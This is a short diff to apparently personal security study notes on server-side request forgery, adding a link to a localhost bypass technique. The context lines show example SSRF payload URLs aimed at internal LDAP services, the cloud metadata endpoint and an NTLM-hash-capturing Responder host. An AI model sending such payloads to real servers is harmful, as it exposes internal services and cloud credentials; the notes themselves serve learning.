@@ -11,3 +11,5 @@ A [[Forgery Attack]] in [[Web Security]] wherein an attacker forces a server to 
 - Reaching internal services using protocols like [[Lightweight Directory Access Protocol|LDAP]], [[Secure File Transfer Protocol|SFTP]], [[Trivial File Transfer Protocol|TFTP]], [[Gopher Protocol]] `https://vuln.com/?fetch=ldap://192.168.0.4`
 - Reaching cloud endpoints `https://vuln.com/?fetch=169.254.169.254/latest/meta-data` 
 - Obtaining [[New Technology LAN Manager|NTLM]] hashes with [[responder]] `https://vuln.com/?fetch=http://responder.daniel.com`
+# Techniques
+- [[SSRF Localhost Bypass Technique]]
